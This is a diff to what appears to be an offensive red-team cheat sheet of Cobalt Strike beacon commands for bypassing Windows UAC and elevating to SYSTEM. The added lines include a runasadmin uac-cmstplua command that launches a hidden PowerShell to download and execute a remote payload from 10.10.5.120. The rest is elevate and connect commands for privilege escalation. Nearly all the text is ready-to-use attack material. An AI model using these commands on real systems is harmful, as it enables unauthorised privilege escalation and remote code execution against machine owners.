@@ -77,15 +77,20 @@ powershell <COMMAND>
 connect <IP> <PORT>
 ```
 
-#### UAC bypass
+#### UAC bypass method 1
 ```
 elevate uac-token-duplication tcp-4444-local
+```
 
+#### UAC bypass method 2 runasadmin
+```
 runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
 connect localhost 4444
 ```
 
-####  Elevate to system
+- Not all UAC bypasses are created equal, can elevate to system with:
+
+#### Elevate to system
 ```
 elevate svc-exe
 ```
